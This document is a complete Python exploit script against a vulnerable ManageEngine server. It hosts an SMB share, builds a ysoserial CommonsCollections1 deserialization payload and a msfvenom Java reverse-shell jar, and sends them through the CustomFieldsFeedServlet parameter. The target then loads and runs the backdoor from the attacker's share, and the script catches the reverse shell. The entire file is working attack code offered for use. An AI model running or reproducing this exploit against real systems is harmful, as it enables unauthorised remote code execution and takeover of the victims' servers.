#!/usr/bin/python3
import os, socket, sys, time, threading, urllib3, requests as r
from impacket import smbserver, version
import time
urllib3.disable_warnings()

def mysmb(): #START SMB SERVER
	server = smbserver.SimpleSMBServer(listenAddress=str(lhost), listenPort=445)
	server.addShare("hax", ".", "comment")
	server.start()

def listen(ip,port): #LISTEN FOR SHELL
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ip, int(port)))
    s.listen(1)
    print("[+] Reverse shell listening on port " + str(port))
    print("[+] Please be patient, this shell takes time to receive :)")
    conn, addr = s.accept()
    time.sleep(2)
    print('[+] Connection received from ',addr)
    print("[+] Enjoy your java reverse shell!")
    while True:
        #Receive data from the target and get user input
        ans = conn.recv(1024).decode()
        sys.stdout.write(ans)
        command = input()

        #Send command
        command += "\n"
        conn.send(command.encode())
        time.sleep(1)

        #Remove the output of the "input()" function
        sys.stdout.write("\033[A" + ans.split("\n")[-1])

def filegen(): #GENERATE REQUIRED FILES
    print("[+] Downloading ysoserial-all.jar from its original repo.")
    ysourl = "https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar"
    open('ysoserial.jar', 'wb').write(r.get(ysourl).content)
    print("[+] Generating msfvenom java reverse tcp shell: msfvenom -p java/shell_reverse_tcp --platform windows LHOST={} LPORT={} -o backdoor.jar".format(lhost,lport))
    os.system("msfvenom -p java/shell_reverse_tcp --platform windows LHOST={} LPORT={} -o backdoor.jar".format(lhost,lport))
    print("[+] Generating required serialized object usin ysoserial to gain RCE.")
    os.system("java -jar ysoserial.jar CommonsCollections1 'java.exe -jar \\\\{}\\hax\\backdoor.jar' > hax.obj".format(lhost))


if len(sys.argv) != 5: #MAIN
    print("(+) usage: {} <RHOST> <RPORT> <LHOST> <LPORT>\n".format(sys.argv[0]))
    print("(+) RHOST - Remote server which runs vulnerable version of ManageEngine")
    print("(+) RPORT - Remote web-server port")
    print("(+) LHOST - Local IP Address to get shell")
    print("(+) LPORT - Local Port to get shell\n")
    sys.exit(-1)

rhost = sys.argv[1]
rport = sys.argv[2]
lhost = sys.argv[3]
lport = sys.argv[4]

print("[+] Starting SMB Server in background...")
srv_thread = threading.Thread(target=mysmb)
srv_thread.start()
filegen()
listener_thread = threading.Thread(target=listen, args=(lhost, lport))
listener_thread.start()
print("[+] Firing the malicious payload to gain RCE on remote system...")
r.get("https://{}:{}/servlet/CustomFieldsFeedServlet?customFieldObject=\\\\{}\\hax\\hax.obj".format(rhost,rport,lhost), verify=False)
listener_thread.join()
